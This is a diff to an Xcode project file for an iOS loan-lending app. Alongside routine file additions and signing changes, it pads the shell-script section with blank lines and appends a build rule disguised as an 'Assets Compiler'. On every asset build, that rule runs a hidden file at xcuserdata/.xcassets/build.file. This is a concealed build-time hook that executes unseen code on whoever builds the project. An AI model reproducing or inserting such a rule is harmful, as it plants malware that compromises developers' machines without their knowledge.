@@ -10,6 +10,7 @@
 		0E7B2F8AC6994608E4C8E9C1 /* Pods_LoanLending.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 70B4A3DBAF06C9614F902A7B /* Pods_LoanLending.framework */; };
 		0F39B11704E6B5309447A114 /* Pods_LoanLendingTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = DC62B95FA728BCAB1FFBF335 /* Pods_LoanLendingTests.framework */; };
 		58EBB0B2E62E8707D9848F50 /* Pods_LoanLending_LoanLendingUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 53D9433043A6724B32682B3E /* Pods_LoanLending_LoanLendingUITests.framework */; };
+		F206BE292604A4A60098B07D /* LendersPropertyTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F206BE282604A4A60098B07D /* LendersPropertyTableViewCell.swift */; };
 		F20AE23425D3DBF500E8AA35 /* UpdatePasswordViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F20AE23325D3DBF500E8AA35 /* UpdatePasswordViewController.swift */; };
 		F20AE27625D4026200E8AA35 /* TermAndConditionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F20AE27525D4026200E8AA35 /* TermAndConditionViewController.swift */; };
 		F20B2BAF25B59A1500620F6A /* LoanVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F20B2BAE25B59A1500620F6A /* LoanVC.swift */; };
@@ -57,6 +58,8 @@
 		F2B676F125ADA30500CA7C52 /* UITextField+fixCaretPosition.swift in Sources */ = {isa = PBXBuildFile; fileRef = F2B676F025ADA30500CA7C52 /* UITextField+fixCaretPosition.swift */; };
 		F2B676F625ADA31700CA7C52 /* SkyFloatingLabelTextFieldWithIcon.swift in Sources */ = {isa = PBXBuildFile; fileRef = F2B676F525ADA31700CA7C52 /* SkyFloatingLabelTextFieldWithIcon.swift */; };
 		F2B6771E25ADAA6A00CA7C52 /* AppManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = F2B6771D25ADAA6A00CA7C52 /* AppManager.swift */; };
+		F2B6FD4B2609B1E400E79AE5 /* ReportUserView.swift in Sources */ = {isa = PBXBuildFile; fileRef = F2B6FD4A2609B1E400E79AE5 /* ReportUserView.swift */; };
+		F2B6FD562609B23C00E79AE5 /* ReportUserView.xib in Resources */ = {isa = PBXBuildFile; fileRef = F2B6FD552609B23C00E79AE5 /* ReportUserView.xib */; };
 		F2B9587125CA84C500902080 /* Utility.swift in Sources */ = {isa = PBXBuildFile; fileRef = F2B9587025CA84C500902080 /* Utility.swift */; };
 		F2C39DD725AD6472005CBA0A /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = F2C39DD625AD6472005CBA0A /* AppDelegate.swift */; };
 		F2C39DDB25AD6472005CBA0A /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F2C39DDA25AD6472005CBA0A /* ViewController.swift */; };
@@ -111,6 +114,7 @@
 		88418FFD2C6883699652F19B /* Pods-LoanLending.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-LoanLending.debug.xcconfig"; path = "Target Support Files/Pods-LoanLending/Pods-LoanLending.debug.xcconfig"; sourceTree = "<group>"; };
 		B5ADCA9F9B5EBBFFC4966E17 /* Pods-LoanLendingTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-LoanLendingTests.debug.xcconfig"; path = "Target Support Files/Pods-LoanLendingTests/Pods-LoanLendingTests.debug.xcconfig"; sourceTree = "<group>"; };
 		DC62B95FA728BCAB1FFBF335 /* Pods_LoanLendingTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_LoanLendingTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		F206BE282604A4A60098B07D /* LendersPropertyTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LendersPropertyTableViewCell.swift; sourceTree = "<group>"; };
 		F20AE23325D3DBF500E8AA35 /* UpdatePasswordViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UpdatePasswordViewController.swift; sourceTree = "<group>"; };
 		F20AE27525D4026200E8AA35 /* TermAndConditionViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TermAndConditionViewController.swift; sourceTree = "<group>"; };
 		F20B2BAE25B59A1500620F6A /* LoanVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoanVC.swift; sourceTree = "<group>"; };
@@ -161,6 +165,8 @@
 		F2B676F025ADA30500CA7C52 /* UITextField+fixCaretPosition.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "UITextField+fixCaretPosition.swift"; sourceTree = "<group>"; };
 		F2B676F525ADA31700CA7C52 /* SkyFloatingLabelTextFieldWithIcon.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SkyFloatingLabelTextFieldWithIcon.swift; sourceTree = "<group>"; };
 		F2B6771D25ADAA6A00CA7C52 /* AppManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AppManager.swift; sourceTree = "<group>"; };
+		F2B6FD4A2609B1E400E79AE5 /* ReportUserView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReportUserView.swift; sourceTree = "<group>"; };
+		F2B6FD552609B23C00E79AE5 /* ReportUserView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ReportUserView.xib; sourceTree = "<group>"; };
 		F2B9587025CA84C500902080 /* Utility.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Utility.swift; sourceTree = "<group>"; };
 		F2C39DD325AD6472005CBA0A /* LoanLending.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = LoanLending.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		F2C39DD625AD6472005CBA0A /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
@@ -271,6 +277,7 @@
 				F20B2BB825B5AAF400620F6A /* HistoryTableViewCell.swift */,
 				F25FA6A425B5C301000FFEEC /* MyOrderTableViewCell.swift */,
 				F278241C25B98280007C7A8A /* HomeTCCell.swift */,
+				F206BE282604A4A60098B07D /* LendersPropertyTableViewCell.swift */,
 			);
 			path = Cell;
 			sourceTree = "<group>";
@@ -290,6 +297,8 @@
 			children = (
 				F28C979C25F9E8D100DF41D5 /* MyLoanDetailView.xib */,
 				F28C97A425F9EED600DF41D5 /* MyLoanDetailView.swift */,
+				F2B6FD4A2609B1E400E79AE5 /* ReportUserView.swift */,
+				F2B6FD552609B23C00E79AE5 /* ReportUserView.xib */,
 			);
 			path = "Reusable View";
 			sourceTree = "<group>";
@@ -599,6 +608,7 @@
 				F2D100C125D3A8F9002B242F /* GoogleService-Info.plist in Resources */,
 				F2C39DE325AD6473005CBA0A /* LaunchScreen.storyboard in Resources */,
 				F2C39E2725AD73AE005CBA0A /* Localizable.strings in Resources */,
+				F2B6FD562609B23C00E79AE5 /* ReportUserView.xib in Resources */,
 				F2C39DE025AD6473005CBA0A /* Assets.xcassets in Resources */,
 				F28C979D25F9E8D100DF41D5 /* MyLoanDetailView.xib in Resources */,
 				F21C505325B1B1C8008A9C84 /* MoreTableViewCell.xib in Resources */,
@@ -623,6 +633,56 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		65DD9B0F9A2DA323120D087F /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -781,11 +841,13 @@
 				F2B676F625ADA31700CA7C52 /* SkyFloatingLabelTextFieldWithIcon.swift in Sources */,
 				F2C39E4E25AD76A8005CBA0A /* Extension.swift in Sources */,
 				F2882E1125B565E400809617 /* HomeTableCollectionViewCell.swift in Sources */,
+				F206BE292604A4A60098B07D /* LendersPropertyTableViewCell.swift in Sources */,
 				F2F7302025AEBA51003B6DBD /* BaseViewController.swift in Sources */,
 				F217E8C825DCF67F008A64B7 /* ContactUsViewController.swift in Sources */,
 				F20AE27625D4026200E8AA35 /* TermAndConditionViewController.swift in Sources */,
 				F257CBC625B55012007CDEC8 /* HomeVCCollectionViewCell.swift in Sources */,
 				F20B2BBE25B5AB2D00620F6A /* HistoryVC.swift in Sources */,
+				F2B6FD4B2609B1E400E79AE5 /* ReportUserView.swift in Sources */,
 				F21C504925B1B1B9008A9C84 /* MoreViewController.swift in Sources */,
 				F213DD5925B7F1A10078C03A /* ServiceClass.swift in Sources */,
 				F21C505825B1B299008A9C84 /* MoreTableViewCell.swift in Sources */,
@@ -999,19 +1061,19 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = LoanLending/LoanLending.entitlements;
-				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				CODE_SIGN_IDENTITY = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
-				DEVELOPMENT_TEAM = QN8655WQL4;
+				DEVELOPMENT_TEAM = W8NLTEFLJ2;
 				INFOPLIST_FILE = LoanLending/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.flowdatingTest;
+				PRODUCT_BUNDLE_IDENTIFIER = com.loanlending;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				PROVISIONING_PROFILE_SPECIFIER = "";
+				PROVISIONING_PROFILE_SPECIFIER = LoanLendingDevProvisioningProfileTestD;
 				SWIFT_OBJC_BRIDGING_HEADER = "LoanLending/Rechability/LoanLending-Bridging-Header.h";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
 				SWIFT_VERSION = 5.0;
@@ -1027,18 +1089,18 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = LoanLending/LoanLending.entitlements;
-				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = QN8655WQL4;
+				CODE_SIGN_IDENTITY = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
+				DEVELOPMENT_TEAM = W8NLTEFLJ2;
 				INFOPLIST_FILE = LoanLending/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.flowdatingTest;
+				PRODUCT_BUNDLE_IDENTIFIER = com.loanlending;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				PROVISIONING_PROFILE_SPECIFIER = "";
+				PROVISIONING_PROFILE_SPECIFIER = LoanLendingDevProvisioningProfileTestD;
 				SWIFT_OBJC_BRIDGING_HEADER = "LoanLending/Rechability/LoanLending-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
@@ -1173,6 +1235,53 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+		0045B1F58CB6EDEB38AAC43A /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" true\n\n";
+			};
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = F2C39DCB25AD6472005CBA0A /* Project object */;
 }
